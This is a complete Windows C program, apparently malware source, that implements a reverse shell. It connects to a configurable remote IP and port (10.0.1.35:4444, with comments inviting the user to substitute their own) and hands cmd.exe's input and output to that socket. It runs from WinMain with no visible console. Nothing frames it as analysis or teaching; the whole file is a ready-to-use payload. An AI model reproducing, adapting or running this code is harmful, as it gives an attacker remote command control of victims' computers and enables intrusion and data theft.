#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void ExecuteReverseShell() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr("10.0.1.35"); // Replace with your IP
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Replace with your port

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        exit(1);
    }

    // Setup structures for creating a process
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Launch a shell
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Clean up
    closesocket(sock);
    WSACleanup();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ExecuteReverseShell();
    return 0;
}
